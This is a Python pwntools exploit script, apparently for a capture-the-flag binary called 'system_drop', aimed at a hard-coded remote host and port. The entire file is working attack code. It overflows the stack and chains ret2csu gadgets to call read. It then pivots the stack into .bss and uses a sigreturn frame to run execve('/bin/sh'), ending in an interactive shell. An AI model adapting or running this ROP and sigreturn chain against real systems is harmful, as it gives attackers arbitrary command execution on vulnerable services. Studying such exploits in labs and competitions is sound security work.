#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host localhost --port 44 ./system_drop
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('./system_drop')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or '188.166.156.37'
port = int(args.PORT or 31642)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)

io = start()

pop_csu = 0x4005ca
call_csu = 0x4005b0

def ret2csu(call_func, edi, rsi, rdx, rbx_a = 0, rbp_a = 0, r12_a = 0, r13_a = 0, r14_a = 0, r15_a = 0, pop=True):
    p_csu = ''
    if pop == True:
        p_csu += p64(pop_csu)
        p_csu += p64(0) # rbx
        p_csu += p64(0+1) # rbp
        p_csu += p64(call_func) # r12
        p_csu += p64(edi) # r13
        p_csu += p64(rsi) # r14
        p_csu += p64(rdx) # r15

    p_csu += p64(call_csu)
    p_csu += p64(0) #junk
    p_csu += p64(rbx_a) # rbx
    p_csu += p64(rbp_a) # rbp
    p_csu += p64(r12_a) # r12
    p_csu += p64(r13_a) # r13
    p_csu += p64(r14_a) # r14
    p_csu += p64(r15_a) # r15

    return p_csu

syscall = 0x0000000000400537+4
read_got = exe.got['read']
leave = 0x000000000040056e

p = 'a'*4*8
p += p64(exe.bss()+0x100)
p += ret2csu(read_got, 0, exe.bss()+0x100, 0x500, rbp_a = exe.bss()+0x100-8)
p += p64(leave)

print len(p)
p = p.ljust(0x100,"\x00")
io.send(p)

p = ret2csu(read_got, 0, exe.bss()+0x500, 15)
p += p64(syscall)
frame = SigreturnFrame()
frame.rax = 0x3b # 59 excerve
frame.rdi = exe.bss()+0x500 # bss -> "/bin/sh\x00"
frame.rsi = 0 # harus 0
frame.rdx = 0 # harus 0
frame.rsp = exe.bss()+0x800
frame.rip = syscall # jump -> syscall
p += str(frame)
p = p.ljust(0x500,"\x00")
io.send(p)

p = '/bin/sh'.ljust(15,"\x00")
io.send(p)

io.interactive()
